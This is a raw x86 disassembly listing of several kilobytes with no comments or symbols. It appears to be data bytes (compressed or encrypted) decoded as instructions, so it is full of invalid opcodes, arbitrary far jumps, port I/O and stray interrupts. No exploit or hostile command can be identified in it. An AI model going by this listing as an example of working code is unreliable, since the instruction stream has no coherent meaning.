  425665:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  425667:	pop    edi
  425668:	and    eax,0xe6d94e28
  42566d:	loop   0x4256ea
  42566f:	push   edi
  425671:	ja     0x425654
  425673:	test   al,0x69
  425675:	aas    
  425676:	stc    
  425677:	mov    eax,ds:0xda6e7345
  42567c:	arpl   WORD PTR [ebp+0x6e8ffc23],si
  425682:	or     bh,BYTE PTR [ecx+ebx*2+0x2a2dc5e8]
  425689:	int    0x63
  42568b:	retf   
  42568c:	scas   eax,DWORD PTR es:[edi]
  42568d:	jnp    0x42566e
  42568f:	inc    ebp
  425690:	mov    al,0xd9
  425692:	out    dx,eax
  425693:	jmp    0xaa35:0xa76d839f
  42569a:	aam    0xe8
  42569c:	popf   
  42569d:	test   BYTE PTR [ecx+eax*4],0x7e
  4256a1:	loope  0x4256fd
  4256a3:	add    ecx,DWORD PTR [eax+0x361a52b4]
  4256a9:	mov    ?,WORD PTR [eax]
  4256ab:	add    eax,esi
  4256ad:	or     DWORD PTR [esi],ecx
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	sbb    ecx,DWORD PTR gs:0x1ce96fe
  4256cd:	add    ch,bh
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR [eax],dl
  4256d3:	ss pop es
  4256d5:	xchg   edi,eax
  4256d6:	xchg   DWORD PTR [esi+0x5e],ebp
  4256d9:	mov    ch,0x31
  4256db:	jp     0x4256df
  4256dd:	mov    ah,0xf5
  4256df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e0:	shl    DWORD PTR [ecx+edx*4-0x65eab73e],0x40
  4256e8:	pop    ss
  4256e9:	xor    al,0x1f
  4256eb:	in     al,0x5d
  4256ed:	rcr    BYTE PTR [edi],1
  4256ef:	jmp    0xe5a8:0x47e448c6
  4256f6:	sub    eax,0x2285a4b2
  4256fb:	pop    esp
  4256fc:	sbb    al,0x83
  4256fe:	outs   dx,DWORD PTR ds:[esi]
  4256ff:	adc    DWORD PTR [esp+edx*8+0x42],eax
  425703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425704:	push   ebx
  425705:	cli    
  425706:	add    DWORD PTR [eax-0x43],0xffffffd9
  42570a:	cmp    eax,0xbf7f0424
  42570f:	sbb    BYTE PTR [ebx-0x4e852140],cl
  425715:	imul   esi,DWORD PTR [edi-0x2e],0x29
  425719:	cld    
  42571a:	sbb    DWORD PTR [esi-0x2f],ecx
  42571d:	add    ecx,DWORD PTR [eax]
  42571f:	loop   0x425769
  425721:	xchg   BYTE PTR [edi-0x2a8b6300],cl
  425727:	add    eax,0x4f65a58
  42572c:	test   eax,0xc1c353d2
  425731:	cld    
  425732:	imul   edx,DWORD PTR [edi+0x1b],0x8a5805a
  425739:	add    eax,0x7756156d
  42573e:	je     0x42571c
  425740:	cmp    BYTE PTR [ebp-0x1bb1d8ee],ah
  425746:	add    bh,bh
  425748:	xor    BYTE PTR [esi-0x79086d99],0xb
  42574f:	jb     0x425772
  425751:	push   ebx
  425752:	lods   al,BYTE PTR ds:[esi]
  425753:	inc    ecx
  425754:	test   DWORD PTR [eax+edi*1],edi
  425757:	sub    DWORD PTR [ebp-0x33],edx
  42575a:	out    0x7a,al
  42575c:	or     al,0xf
  42575e:	(bad)  
  42575f:	fstp   DWORD PTR [eax]
  425761:	(bad)  
  425762:	out    0x12,eax
  425764:	fidivr WORD PTR [esi-0x9]
  425767:	adc    edx,0xe44b1bb3
  42576d:	xor    dl,al
  42576f:	imul   eax,DWORD PTR [eax+0x1a257fc],0xffffffca
  425776:	not    BYTE PTR [ecx+0x40]
  425779:	mov    esi,0x72d5065c
  42577e:	push   eax
  42577f:	retf   0x666e
  425782:	nop
  425783:	ret    0xa5e
  425786:	sahf   
  425787:	xor    DWORD PTR [ecx],edi
  425789:	test   BYTE PTR [edi],0x7f
  42578c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42578e:	in     ax,dx
  425790:	xlat   BYTE PTR ds:[ebx]
  425791:	or     DWORD PTR [ebp+0x2b],0xedb341fb
  425798:	xor    al,0x95
  42579a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42579b:	(bad)  
  42579c:	and    BYTE PTR [edi+0x27c79102],ch
  4257a2:	dec    eax
  4257a3:	cld    
  4257a4:	adc    al,0x86
  4257a6:	fst    DWORD PTR [esi-0x4c]
  4257a9:	stos   DWORD PTR es:[edi],eax
  4257aa:	ret    
  4257ab:	pop    ebx
  4257ac:	push   edx
  4257ad:	mov    ebx,0x9cd4a094
  4257b2:	lods   al,BYTE PTR ds:[esi]
  4257b3:	es addr16 mov edx,0xd2ace2a3
  4257ba:	sbb    BYTE PTR [ebp-0x5758ec25],bh
  4257c0:	ins    DWORD PTR es:[edi],dx
  4257c1:	sar    DWORD PTR [ebx+ebp*2+0x5d],cl
  4257c5:	iret   
  4257c6:	out    0xf5,al
  4257c8:	aad    0x9f
  4257ca:	add    ah,BYTE PTR [ecx+0x6d]
  4257cd:	and    bl,BYTE PTR [eax+0x6c]
  4257d0:	lods   eax,DWORD PTR ds:[esi]
  4257d1:	mov    dl,0x7c
  4257d3:	adc    BYTE PTR [ecx],0xde
  4257d6:	mov    cl,0x9c
  4257d8:	int3   
  4257d9:	sti    
  4257da:	popa   
  4257db:	xchg   edi,eax
  4257dc:	enter  0x7dd3,0xed
  4257e0:	aas    
  4257e1:	(bad)  
  4257e2:	cmp    al,0x6d
  4257e4:	mov    ds:0xe990f9fc,al
  4257e9:	adc    DWORD PTR [ebp+0x2f0cfad8],ebx
  4257ef:	and    cl,BYTE PTR [eax+0x1befaf23]
  4257f5:	push   0x1a4a7799
  4257fa:	sbb    eax,0xd5115d65
  4257ff:	call   0xbcda2946
  425804:	mov    DWORD PTR [ebx-0xf4ee7eb],edi
  42580a:	sub    dl,ah
  42580c:	sbb    DWORD PTR [edx],0x60d3ea0c
  425812:	cwde   
  425813:	imul   esp,DWORD PTR [edi+0x62],0x7f
  425817:	jns    0x425808
  425819:	add    ebx,esp
  42581b:	sub    BYTE PTR [ecx],ch
  42581d:	sbb    DWORD PTR [esp+ecx*8+0x13c31918],ebp
  425824:	call   ecx
  425826:	add    edi,DWORD PTR [eax]
  425828:	xor    DWORD PTR [ecx-0x4d50dcab],eax
  42582e:	test   DWORD PTR [ebp-0x80],esp
  425831:	xlat   BYTE PTR ds:[ebx]
  425832:	xor    eax,0xd0bc73a0
  425837:	jl     0x425889
  425839:	and    eax,eax
  42583b:	imul   ecx,esp,0xffffff8c
  42583e:	sbb    eax,0x5332e9c9
  425843:	je     0x425816
  425845:	out    dx,al
  425846:	gs jg  0x4257dc
  425849:	add    bl,0x7
  42584c:	ret    
  42584d:	mov    edi,0x9554fe32
  425852:	call   FWORD PTR [edi]
  425854:	jne    0x42588c
  425856:	inc    esp
  425857:	xchg   ebx,eax
  425858:	sub    BYTE PTR [ebx+0x2655c726],ch
  42585e:	adc    BYTE PTR [esi-0x14],0xc8
  425862:	mov    bh,0x1e
  425864:	loope  0x4258b7
  425866:	or     eax,0x6fcd0582
  42586b:	or     al,0xf2
  42586d:	xchg   esp,eax
  42586e:	lds    eax,FWORD PTR [esi+ebp*1-0x4a]
  425872:	lds    esi,FWORD PTR [ebp+0x340ba880]
  425878:	int    0xc8
  42587a:	mov    ss,WORD PTR [ebp-0xe5a9c70]
  425880:	icebp  
  425881:	xor    ch,dh
  425883:	xchg   DWORD PTR [ecx],edx
  425885:	xor    BYTE PTR [ebx-0x2e2874b9],0xc3
  42588c:	ds inc esi
  42588e:	jnp    0x4258e8
  425890:	cmovl  edx,DWORD PTR [edi+0x59]
  425894:	xchg   ebx,eax
  425895:	mov    bl,0x63
  425897:	mov    edi,0xf09bab40
  42589c:	gs loopne 0x4258e6
  42589f:	jae    0x425886
  4258a1:	jle    0x42589d
  4258a3:	pop    es
  4258a4:	mov    eax,ds:0x8de83b3a
  4258a9:	(bad)  
  4258aa:	jmp    0x7e25:0x5dd4877
  4258b1:	add    al,BYTE PTR [ebp-0x2c]
  4258b4:	pop    ebp
  4258b5:	cmp    DWORD PTR [edi],ecx
  4258b7:	add    eax,0x448c6865
  4258bc:	out    dx,eax
  4258bd:	xchg   edx,eax
  4258be:	push   ebp
  4258bf:	ret    0x2622
  4258c2:	gs xchg ebp,eax
  4258c4:	fstp   DWORD PTR [eax-0x27]
  4258c7:	addr16 fisub WORD PTR [bx+si-0x3c10]
  4258cd:	xor    DWORD PTR [edi],eax
	...
  4258d7:	add    BYTE PTR [eax],al
  4258d9:	add    BYTE PTR [ebx+0x45],cl
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	mov    edi,0x93a16c0d
  4258eb:	rol    BYTE PTR [ecx],1
  4258ed:	add    ch,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [edx],ch
  4258f3:	xor    ecx,DWORD PTR [ebp-0x2cb50fc9]
  4258f9:	in     al,dx
  4258fa:	xchg   ebp,eax
  4258fb:	or     DWORD PTR [ebx-0x6b],edx
  4258fe:	call   0xf917da23
  425903:	mov    ds:0x1d3eb2fd,al
  425908:	mov    edi,0x6a184378
  42590d:	adc    ah,BYTE PTR [esi]
  42590f:	fst    st(1)
  425911:	mov    ds:0x4232309c,al
  425916:	(bad)  
  425917:	lahf   
  425918:	jl     0x4258ec
  42591a:	adc    eax,0xac5d7885
  42591f:	push   ds
  425920:	test   al,0x6f
  425922:	jmp    0x4258aa
  425924:	call   0xfc19:0x2b385e6b
  42592b:	inc    edx
  42592c:	dec    edx
  42592d:	data16 fst DWORD PTR [esi+0x16e28bed]
  425934:	dec    edi
  425935:	shr    BYTE PTR [ebx+edx*1],0x76
  425939:	rcr    DWORD PTR [ebx],0xfd
  42593c:	push   ebp
  42593d:	jns    0x4258f9
  42593f:	mov    eax,ds:0xe1d46f54
  425944:	xor    eax,DWORD PTR ds:0x90ada2c7
  42594a:	scas   al,BYTE PTR es:[edi]
  42594b:	or     bh,cl
  42594d:	outs   dx,BYTE PTR ds:[esi]
  42594e:	out    dx,al
  42594f:	daa    
  425950:	lahf   
  425951:	fs jbe 0x4258e3
  425954:	adc    ecx,DWORD PTR [edi-0x1fdbf63c]
  42595a:	fs pop ss
  42595c:	test   al,0x2
  42595e:	ss mov ebp,0xffcba2c6
  425964:	mov    al,ds:0x8d27e0dd
  425969:	xchg   ebp,eax
  42596a:	retf   
  42596b:	adc    eax,esp
  42596d:	outs   dx,BYTE PTR ds:[esi]
  42596e:	adc    edi,DWORD PTR [esi]
  425970:	jmp    0xe457f257
  425975:	lahf   
  425976:	sub    ah,BYTE PTR [ebx-0x686cf26e]
  42597c:	sub    dh,BYTE PTR [ebx-0x4319b165]
  425982:	repnz mov ds:0x22b49b3f,eax
  425988:	lods   eax,DWORD PTR ds:[esi]
  425989:	jne    0x425967
  42598b:	jo     0x42592c
  42598d:	dec    ebx
  42598e:	cmp    edi,esi
  425990:	xor    eax,0xaf48f895
  425995:	and    BYTE PTR [ebp-0x4dc356da],cl
  42599b:	push   ebp
  42599c:	cmp    dl,bl
  42599e:	pop    ds
  42599f:	retf   0x6dfa
  4259a2:	push   edx
  4259a3:	push   ds
  4259a4:	loopne 0x425a00
  4259a6:	mov    ds:0xfe1171cc,eax
  4259ab:	bound  esp,QWORD PTR [ebp-0x3ae802c4]
  4259b1:	push   edx
  4259b2:	adc    esp,DWORD PTR [edi+0xc]
  4259b5:	lds    ecx,FWORD PTR [ebx]
  4259b7:	and    al,0x26
  4259b9:	inc    eax
  4259ba:	jmp    0xfc41:0xe7656693
  4259c1:	ret    0xc375
  4259c4:	sub    eax,0xed5014f1
  4259c9:	inc    edi
  4259ca:	push   ebp
  4259cb:	jg     0x4259fc
  4259cd:	mov    al,ds:0xa1542b1f
  4259d2:	popa   
  4259d3:	mov    ah,0xef
  4259d5:	pusha  
  4259d6:	or     eax,DWORD PTR ds:0xd35c36b3
  4259dc:	int3   
  4259dd:	outs   dx,DWORD PTR ds:[esi]
  4259de:	xchg   esp,eax
  4259df:	test   BYTE PTR [edx+0x48d8aac5],dl
  4259e5:	call   0x8aeb:0x963ee857
  4259ec:	push   ebx
  4259ed:	push   0xe
  4259ef:	repnz ins DWORD PTR es:[edi],dx
  4259f1:	jns    0x42598f
  4259f3:	cmc    
  4259f4:	ss jg  0x425a36
  4259f7:	sti    
  4259f8:	jge    0x425a4b
  4259fa:	add    BYTE PTR [eax-0x31],cl
  4259fd:	or     BYTE PTR [eax+0x68],ch
  425a00:	cdq    
  425a01:	les    edx,FWORD PTR [edx]
  425a03:	iret   
  425a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a05:	popa   
  425a06:	sbb    BYTE PTR [esi+0x7e401648],cl
  425a0c:	push   0x71850e9e
  425a11:	jp     0xc842c708
  425a17:	rol    DWORD PTR [edi-0x1b],cl
  425a1a:	and    cl,cl
  425a1c:	dec    edi
  425a1d:	dec    esi
  425a1e:	jp     0x425a91
  425a20:	mov    ds:0xb411bcba,al
  425a25:	lock retf 0x17dd
  425a29:	cwde   
  425a2a:	fimul  WORD PTR [ebx]
  425a2c:	mov    ah,0xdc
  425a2e:	hlt    
  425a2f:	add    bl,BYTE PTR [eax-0xd54cbc7]
  425a35:	mov    WORD PTR [ecx+ebx*4-0x1b0e5ec8],?
  425a3c:	cmp    ebp,DWORD PTR [ecx-0x4d219801]
  425a42:	xchg   ebx,eax
  425a43:	shl    DWORD PTR [esi],0x23
  425a46:	stc    
  425a47:	in     al,0x92
  425a49:	push   edi
  425a4a:	sub    eax,0x2f8b6d4
  425a4f:	and    al,0xea
  425a51:	sbb    DWORD PTR [edx],ecx
  425a53:	inc    ecx
  425a54:	hlt    
  425a55:	mov    bh,0x9f
  425a57:	fst    QWORD PTR [esi+0x2e2b8b14]
  425a5d:	cmp    ebp,DWORD PTR [ebx-0x253f9e4e]
  425a63:	sub    edi,DWORD PTR [edx+0x13757077]
  425a69:	xor    al,0xdc
  425a6b:	ins    BYTE PTR es:[edi],dx
  425a6c:	loop   0x425a3d
  425a6e:	mov    ds:0x764fe178,al
  425a73:	jmp    0xe08bf773
  425a78:	jae    0x425acb
  425a7a:	test   eax,0xa6b80b5
  425a7f:	pusha  
  425a80:	pop    ds
  425a81:	bound  ecx,QWORD PTR ds:[ebx]
  425a84:	mov    esi,0x1be4ea12
  425a89:	loop   0x425a9f
  425a8b:	push   esp
  425a8c:	xchg   BYTE PTR [edi],ah
  425a8e:	pop    edi
  425a8f:	inc    ebx
  425a90:	mov    ebx,0x18fd41dd
  425a95:	dec    eax
  425a96:	jnp    0x425ab0
  425a98:	pop    ds
  425a99:	and    eax,0xa16ebee9
  425a9e:	mov    dl,0xe6
  425aa0:	jno    0x425a9c
  425aa2:	jnp    0x425a5f
  425aa4:	push   esi
  425aa5:	pop    ecx
  425aa6:	pop    esi
  425aa7:	leave  
  425aa8:	retf   0x3f73
  425aab:	inc    edi
  425aac:	jg     0x425a38
  425aae:	mov    DWORD PTR [esi-0x4d],ebx
  425ab1:	pop    DWORD PTR [edx]
  425ab3:	jb     0x425aa7
  425ab5:	adc    DWORD PTR [ecx+0x52159bd6],esi
  425abb:	mov    DWORD PTR [eax+0x42e1e9f],eax
  425ac1:	sti    
  425ac2:	mov    ds:0x7b77abeb,eax
  425ac7:	stos   DWORD PTR es:[edi],eax
  425ac8:	pop    ebp
  425ac9:	pop    edx
  425aca:	mov    dl,0x3
  425acc:	xor    eax,0x99b83686
  425ad1:	cmp    DWORD PTR [ebx+0x9],edi
  425ad4:	aam    0x9a
  425ad6:	inc    eax
  425ad7:	push   ss
  425ad8:	mov    al,0xb
  425ada:	pop    ss
  425adb:	add    esi,0xcb23b068
  425ae1:	pop    ss
  425ae2:	lods   eax,DWORD PTR ds:[esi]
  425ae3:	xchg   edx,eax
  425ae4:	ss fwait
  425ae6:	sub    al,0x59
  425ae8:	mov    bl,0xc8
  425aea:	imul   ecx,edx,0xffffff9c
  425aed:	fld    QWORD PTR [edi]
	...
  425af7:	add    BYTE PTR [eax],al
  425af9:	add    BYTE PTR [edx-0x5b61f90],ch
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	and    al,0x3f
  425b08:	pop    ebx
  425b09:	int3   
  425b0a:	nop
  425b0b:	rol    BYTE PTR [ecx],cl
  425b0d:	add    ch,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [ebx+0x18a59958],ah
  425b17:	mov    ds:0x470d1dda,eax
  425b1c:	clc    
  425b1d:	xchg   edx,eax
  425b1e:	or     ebx,DWORD PTR [edx]
  425b20:	enter  0xbbd4,0x73
  425b24:	inc    esi
  425b25:	shr    BYTE PTR [esp+edx*1+0x2266abf4],1
  425b2c:	pop    esi
  425b2d:	aaa    
  425b2e:	fisttp WORD PTR [eax-0x3e]
  425b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b32:	bound  ebx,QWORD PTR [edi+esi*1+0x33]
  425b36:	js     0x425b77
  425b38:	push   ebx
  425b39:	mov    eax,ds:0x2ff1e006
  425b3e:	and    ch,BYTE PTR [esi+0xf8d9e7c]
  425b44:	xchg   ebp,eax
  425b45:	or     BYTE PTR [edi],0xd7
  425b48:	and    eax,0x4dcdc5d0
  425b4d:	aaa    
  425b4e:	pop    edx
  425b4f:	mov    edi,0x4af68245
  425b54:	adc    eax,0xe4f482d
  425b59:	imul   edx,DWORD PTR [esi+0x4e],0x9ee8954
  425b60:	jmp    0x425b0c
  425b62:	pop    edx
  425b63:	stos   BYTE PTR es:[edi],al
  425b64:	adc    DWORD PTR [edi+0x335e1951],edx
  425b6a:	mov    bl,0xa6
  425b6c:	push   esp
  425b6d:	mov    esp,0xb93419bd
  425b72:	add    eax,0xf5c6e000
  425b77:	mov    edi,0x89c58d1b
  425b7c:	push   ss
  425b7d:	adc    eax,0x78bc08ce
  425b82:	hlt    
  425b83:	enter  0x778e,0x5f
  425b87:	add    eax,0x6f05292c
  425b8c:	adc    esi,esp
  425b8e:	rcl    DWORD PTR [ebp+0x56],0xbd
  425b92:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b94:	pop    ebp
  425b95:	mov    cl,0xe5
  425b97:	scas   al,BYTE PTR es:[edi]
  425b98:	test   BYTE PTR [ecx-0x61],0x95
  425b9c:	xor    esp,DWORD PTR ds:0x39d8869a
  425ba2:	dec    edx
  425ba3:	mov    ecx,0xd1e9ee13
  425ba8:	mov    dh,0x2c
  425baa:	and    BYTE PTR [edi+edx*1-0x10],0x97
  425baf:	arpl   WORD PTR [eax+0x7f],di
  425bb2:	or     bh,bl
  425bb4:	add    ch,BYTE PTR [ebp-0x28010df1]
  425bba:	icebp  
  425bbb:	setne  BYTE PTR [esi+edx*8-0x67]
  425bc0:	cmp    dh,BYTE PTR [eax-0x3e]
  425bc3:	sti    
  425bc4:	leave  
  425bc5:	inc    esi
  425bc6:	ins    DWORD PTR es:[edi],dx
  425bc7:	aad    0x8c
  425bc9:	dec    ebx
  425bca:	lahf   
  425bcb:	pop    edx
  425bcc:	test   DWORD PTR [eax+0x4e3d0575],0xff7717d2
  425bd6:	mov    dl,0x22
  425bd8:	adc    DWORD PTR [edi-0x32ae0c5d],esi
  425bde:	adc    dl,BYTE PTR [edx-0x53a0aef1]
  425be4:	mov    ecx,0x38a6edd1
  425be9:	sahf   
  425bea:	arpl   WORD PTR [edi+0x20aae077],si
  425bf0:	mov    esi,0x40802ebf
  425bf5:	xchg   ebx,eax
  425bf6:	popa   
  425bf7:	imul   eax,DWORD PTR [esp+eax*4-0x49ea8044],0xfffffff0
  425bff:	out    dx,eax
  425c00:	fstp   DWORD PTR [edx+eiz*8]
  425c03:	imul   esp,DWORD PTR [esi+0x6a0efef1],0xffffffcd
  425c0a:	(bad)  
  425c0b:	leave  
  425c0c:	cwde   
  425c0d:	in     ax,dx
  425c0f:	js     0x425c34
  425c11:	into   
  425c12:	xlat   BYTE PTR ds:[ebx]
  425c13:	test   eax,0xc155f5d6
  425c18:	fcomp  DWORD PTR [eax]
  425c1a:	bound  ecx,QWORD PTR [edx+0x22af0a79]
  425c20:	out    0x6e,eax
  425c22:	pop    ss
  425c23:	dec    ebx
  425c24:	xlat   BYTE PTR ds:[ebx]
  425c25:	and    eax,0x206d622e
  425c2a:	and    bl,BYTE PTR [esi-0x1f00cb4f]
  425c30:	int3   
  425c31:	add    eax,0x240921e4
  425c36:	adc    DWORD PTR [edx-0x4bd4f85a],edx
  425c3c:	loope  0x425c1c
  425c3e:	sbb    al,BYTE PTR ds:0x8800c517
  425c44:	int    0x9e
  425c46:	sbb    al,0xa9
  425c48:	sahf   
  425c49:	mov    ebp,0x6c7d75a5
  425c4e:	(bad)  
  425c4f:	mov    esi,0xef0719e2
  425c54:	mov    ch,0x8f
  425c56:	push   eax
  425c57:	and    bl,dl
  425c59:	and    DWORD PTR [ebx],ecx
  425c5b:	or     BYTE PTR [edi],dl
  425c5d:	gs jl  0x425ca9
  425c60:	bsr    edx,DWORD PTR [ebx+0x5be9260b]
  425c67:	mov    al,ds:0xa28e9992
  425c6c:	mov    esp,0x531f16a8
  425c71:	push   0xffffffca
  425c73:	in     al,0x8d
  425c75:	adc    al,BYTE PTR [edi]
  425c77:	push   edx
  425c78:	cmc    
  425c79:	ret    0x2757
  425c7c:	fiadd  WORD PTR [esi+0x2477f881]
  425c82:	cmp    edi,DWORD PTR [esi-0x70213aea]
  425c88:	add    eax,0xd9685e95
  425c8d:	test   eax,ecx
  425c8f:	xchg   edx,eax
  425c90:	inc    eax
  425c91:	sub    ebp,DWORD PTR [esi-0xb14838d]
  425c97:	sbb    DWORD PTR [ebp*8-0x758911d1],edx
  425c9e:	add    BYTE PTR [ebp+0x1dd5c52c],0xc8
  425ca5:	pop    ss
  425ca6:	fcmovnbe st,st(4)
  425ca8:	jbe    0x425cc5
  425caa:	adc    cl,ah
  425cac:	test   eax,0x3af6e66a
  425cb1:	adc    BYTE PTR [ebx],dh
  425cb3:	inc    edx
  425cb4:	push   ss
  425cb5:	mov    eax,ds:0x2ed0ef08
  425cba:	stos   DWORD PTR es:[edi],eax
  425cbb:	jg     0x425c60
  425cbd:	stos   BYTE PTR es:[edi],al
  425cbe:	sub    DWORD PTR [ecx],esp
  425cc0:	jne    0x425ced
  425cc2:	inc    esp
  425cc3:	push   esi
  425cc4:	leave  
  425cc5:	add    DWORD PTR [ecx+0x42],esp
  425cc8:	lods   eax,DWORD PTR ds:[esi]
  425cc9:	(bad)  
  425cca:	sbb    BYTE PTR [edi],ch
  425ccc:	cmp    al,0x46
  425cce:	dec    ebp
  425ccf:	lds    eax,FWORD PTR [eax+edi*8-0x7986213a]
  425cd6:	adc    DWORD PTR [ebx],edi
  425cd8:	stos   BYTE PTR es:[edi],al
  425cd9:	repz jne 0x425cfa
  425cdc:	and    esi,DWORD PTR [ebp+0x3f]
  425cdf:	pop    ecx
  425ce0:	out    0x7d,eax
  425ce2:	mov    es,WORD PTR [edi-0x2]
  425ce5:	cwde   
  425ce6:	mov    esi,0xc5d12821
  425ceb:	shl    DWORD PTR [ebx-0x60721707],1
  425cf1:	mov    eax,ds:0xf7bd6551
  425cf6:	fbld   TBYTE PTR [ebx+0x337bf963]
  425cfc:	lock push ebp
  425cfe:	shl    DWORD PTR [edx+0x37ea307f],0x7
  425d05:	jg     0x425d85
  425d07:	mov    ecx,0xe5d51397
  425d0c:	add    al,0x8a
  425d0e:	imul   eax,DWORD PTR [eax],0x0
	...
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x5692def1],ecx
  425d27:	js     0x425d67
  425d29:	or     DWORD PTR [ebp-0x2fffe2c],ecx
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [ebp-0x2b],ah
  425d34:	mov    bh,dh
  425d36:	mov    cl,0x7b
  425d38:	push   edx
  425d39:	sub    ch,al
  425d3b:	and    al,0x91
  425d3d:	out    dx,al
  425d3e:	not    DWORD PTR [ebp+0x60]
  425d41:	fsubr  st(6),st
  425d43:	(bad)  
  425d45:	xlat   BYTE PTR ds:[ebx]
  425d46:	mov    fs,esi
  425d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d49:	je     0x425cfc
  425d4b:	fild   WORD PTR [ecx]
  425d4d:	or     BYTE PTR [ecx+0x53],dh
  425d50:	sahf   
  425d51:	cpuid  
  425d53:	adc    eax,0x77f21d05
  425d58:	mov    bl,0xd0
  425d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d5b:	dec    edi
  425d5c:	dec    esp
  425d5d:	mov    WORD PTR [ebp-0x3b0f397d],ss
  425d63:	cs ret 
  425d65:	jmp    0xe07b573e
  425d6a:	imul   ecx,DWORD PTR [ebx-0x5f57ef83],0x15
  425d71:	adc    eax,0xe01d4ca1
  425d76:	push   ebp
  425d77:	inc    ebp
  425d78:	fwait
  425d79:	jmp    0x684a2d1
  425d7e:	mov    esi,0x55ae4ed3
  425d83:	xor    BYTE PTR [esi],ah
  425d85:	je     0x425dd7
  425d87:	ds js  0x425d98
  425d8a:	test   eax,0xf43a214f
  425d8f:	pop    ss
  425d90:	out    dx,eax
  425d91:	ror    ch,cl
  425d93:	push   edx
  425d94:	ja     0x425d95
  425d96:	outs   dx,DWORD PTR ds:[esi]
  425d97:	popa   
  425d98:	dec    ebp
  425d99:	leave  
  425d9a:	stos   DWORD PTR es:[edi],eax
  425d9b:	aas    
  425d9c:	xchg   ecx,eax
  425d9d:	ins    DWORD PTR es:[edi],dx
  425d9e:	mov    esp,0xac9eaf66
  425da3:	mov    edx,0x393b19d9
  425da8:	cmp    al,0x4d
  425daa:	and    al,0x41
  425dac:	outs   dx,BYTE PTR ds:[esi]
  425dad:	sbb    DWORD PTR [eax+edx*2-0x5c],ebp
  425db1:	into   
  425db2:	mov    ds:0x30f92bfe,al
  425db7:	mov    eax,ds:0x7dbbc196
  425dbc:	xor    DWORD PTR ds:0x512bcee3,esp
  425dc2:	mov    ?,edx
  425dc4:	xchg   edi,eax
  425dc5:	mov    ch,0x3b
  425dc7:	icebp  
  425dc8:	mov    ecx,0x768d6542
  425dce:	dec    DWORD PTR [edi-0x5e]
  425dd1:	mov    dh,0x1c
  425dd3:	mov    edi,0x7b4f1528
  425dd8:	xchg   ecx,eax
  425dd9:	xchg   BYTE PTR [ebp-0x78],cl
  425ddc:	xor    eax,ecx
  425dde:	sbb    al,BYTE PTR [esi+0x79]
  425de1:	stos   BYTE PTR es:[edi],al
  425de2:	daa    
  425de3:	sar    ch,0x1f
  425de6:	xchg   edx,eax
  425de7:	js     0x425e27
  425de9:	aad    0x92
  425deb:	imul   DWORD PTR [ecx-0x33c760dc]
  425df1:	fld    DWORD PTR [edx]
  425df3:	je     0x425e20
  425df5:	rcr    DWORD PTR [ecx],0x92
  425df8:	jno    0x425df3
  425dfa:	xor    eax,0x86ca9f67
  425dff:	inc    esi
  425e00:	cld    
  425e01:	mov    bl,0xf6
  425e03:	in     al,dx
  425e04:	jmp    0xd159a011
  425e09:	in     eax,0x57
  425e0b:	fist   DWORD PTR [eax]
  425e0d:	retf   0x4013
  425e10:	cmp    BYTE PTR [ebx],bh
  425e12:	push   cx
  425e14:	sub    dl,ah
  425e16:	mov    al,0x3
  425e18:	sbb    BYTE PTR [eax+eiz*2],bh
  425e1b:	add    al,0x87
  425e1d:	xchg   ecx,eax
  425e1e:	inc    eax
  425e1f:	stos   DWORD PTR es:[edi],eax
  425e20:	int3   
  425e21:	aaa    
  425e22:	push   es
  425e23:	inc    esp
  425e24:	out    0xcf,eax
  425e26:	dec    eax
  425e27:	xchg   edx,eax
  425e28:	sbb    dl,BYTE PTR [ebx]
  425e2a:	fsubr  DWORD PTR [edi-0x8da3957]
  425e30:	xchg   ebx,eax
  425e31:	xchg   edx,eax
  425e32:	xor    al,dl
  425e34:	pop    esp
  425e35:	cmp    DWORD PTR [edi],esp
  425e37:	retf   0xc856
  425e3a:	je     0x425e23
  425e3c:	int    0x11
  425e3e:	lds    edx,FWORD PTR [edx+0x3cba8410]
  425e44:	ja     0x425e65
  425e46:	inc    ebx
  425e47:	scas   al,BYTE PTR es:[edi]
  425e48:	dec    eax
  425e49:	sub    BYTE PTR [ecx],al
  425e4b:	ins    BYTE PTR es:[edi],dx
  425e4c:	test   bh,cl
  425e4e:	test   BYTE PTR [ebx+0x2b],dl
  425e51:	(bad)  
  425e52:	push   ebp
  425e53:	lods   al,BYTE PTR ds:[esi]
  425e54:	adc    al,0xae
  425e56:	xchg   ecx,eax
  425e57:	pushf  
  425e58:	push   ss
  425e59:	nop
  425e5a:	aam    0xc4
  425e5c:	mov    ecx,0x48d567a6
  425e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e62:	sbb    al,0x4b
  425e64:	jecxz  0x425e13
  425e66:	test   esi,0xa17ef86a
  425e6c:	inc    esi
  425e6d:	jmp    0x425ead
  425e6f:	bound  ebx,QWORD PTR [ecx]
  425e71:	mov    ebx,0xaf8b5df1
  425e76:	rcl    DWORD PTR [ecx+0x46e8b94e],cl
  425e7c:	xchg   ebp,edx
  425e7e:	xor    DWORD PTR [eax-0xa48c057],ebx
  425e84:	test   al,0x60
  425e86:	xor    ebp,0xe77659ae
  425e8c:	int    0x57
